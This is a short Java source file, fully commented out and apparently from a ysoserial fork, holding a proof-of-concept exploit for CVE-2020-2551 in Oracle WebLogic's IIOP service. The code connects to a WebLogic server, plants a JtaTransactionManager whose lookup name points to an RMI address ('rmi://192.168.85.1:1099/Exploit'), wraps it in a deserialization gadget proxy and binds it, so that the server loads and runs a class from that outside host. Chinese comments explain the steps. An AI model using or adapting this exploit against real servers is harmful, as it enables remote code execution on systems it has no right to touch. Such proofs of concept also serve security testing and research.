//package ysoserial;
//
//import com.bea.core.repackaged.springframework.transaction.jta.JtaTransactionManager;
//
//import ysoserial.payloads.util.Gadgets;
//
//import javax.naming.Context;
//import javax.naming.InitialContext;
//import java.rmi.Remote;
//import java.util.Hashtable;
//
//public class CVE_2020_2551{
//    public static void main(String[] args) throws Exception {
//        String ip = "192.168.85.1";
//        String port = "7001";
//        Hashtable<String, String> env = new Hashtable<String, String>();
//        env.put("java.naming.factory.initial", "weblogic.jndi.WLInitialContextFactory");
//        env.put("java.naming.provider.url", String.format("iiop://%s:%s", ip, port));
//        //请求NameService
//        Context context = new InitialContext(env);
//
//        //配置JtaTransactionManager的lookup地址
//        JtaTransactionManager jtaTransactionManager = new JtaTransactionManager();
//        jtaTransactionManager.setUserTransactionName("rmi://192.168.85.1:1099/Exploit");
//
//        //使用基于AnnotationInvocationHandler的动态代理，自动反序列化JtaTransactionManager，从而加载rmi协议指定的类
//        Remote remote = Gadgets.createMemoitizedProxy(Gadgets.createMap("pwned", jtaTransactionManager), Remote.class);
//        context.bind("hello", remote);//注册远程对象
//    }
//}
